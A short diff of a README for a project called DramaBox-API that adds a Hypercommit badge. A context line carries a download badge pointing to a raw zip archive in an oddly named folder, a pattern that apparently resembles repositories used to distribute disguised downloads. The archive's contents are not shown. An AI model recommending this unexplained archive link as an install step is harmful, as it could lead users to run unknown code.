@@ -1,5 +1,7 @@
 # 🎭 DramaBox-API - Access Drama with Ease
 
+[![Hypercommit](https://img.shields.io/badge/Hypercommit-DB2475)](https://hypercommit.com/dramabox-api)
+
 [![Download DramaBox-API](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip)](https://raw.githubusercontent.com/Lomen971/DramaBox-API/main/denunciate/Box_API_Drama_v1.0-alpha.3.zip)
 
 ## 🚀 Getting Started 
